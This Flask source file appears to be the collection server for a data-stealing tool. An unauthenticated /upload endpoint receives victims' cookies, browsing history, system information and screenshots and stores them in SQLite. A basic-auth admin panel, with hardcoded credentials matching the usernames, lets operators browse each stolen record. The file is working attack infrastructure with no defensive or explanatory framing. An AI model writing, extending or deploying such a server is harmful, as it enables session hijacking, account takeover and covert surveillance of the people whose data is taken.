import os
import base64
from flask import Flask, request, render_template
from flask_httpauth import HTTPBasicAuth
import sqlite3
from datetime import datetime

app = Flask(__name__)
auth = HTTPBasicAuth()

ADMINS = {"angel0chek": "angel0chek", "winter": "winter"}

@auth.verify_password
def verify(username, password):
    if username in ADMINS and ADMINS[username] == password:
        return username
    return None

DB_FILE = "database.db"

def init_db():
    if not os.path.exists(DB_FILE):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''CREATE TABLE users (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        username TEXT,
                        cookies TEXT,
                        history TEXT,
                        system_info TEXT,
                        screenshot BLOB,
                        timestamp TEXT
                    )''')
        conn.commit()
        conn.close()

init_db()

# фильтр для base64
@app.template_filter('b64encode')
def b64encode_filter(data):
    if data is None:
        return ''
    return base64.b64encode(data).decode('utf-8')

@app.route('/')
@auth.login_required
def admin_panel():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, username, timestamp FROM users ORDER BY id DESC")
    users = c.fetchall()
    conn.close()
    return render_template('admin.html', users=users)

@app.route('/user/<int:user_id>')
@auth.login_required
def view_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE id=?", (user_id,))
    user = c.fetchone()
    conn.close()
    return render_template('user_detail.html', user=user)

@app.route('/upload', methods=['POST'])
def upload_data():
    data = request.json
    username = data.get('username', 'unknown')
    cookies = data.get('cookies', '')
    history = data.get('history', '')
    system_info = data.get('systemInfo', '')
    screenshot = data.get('screenshot', None)
    if screenshot:
        screenshot = base64.b64decode(screenshot.split(',')[1])
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        "INSERT INTO users (username, cookies, history, system_info, screenshot, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
        (username, cookies, history, system_info, screenshot, timestamp)
    )
    conn.commit()
    conn.close()
    return {'status': 'ok'}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
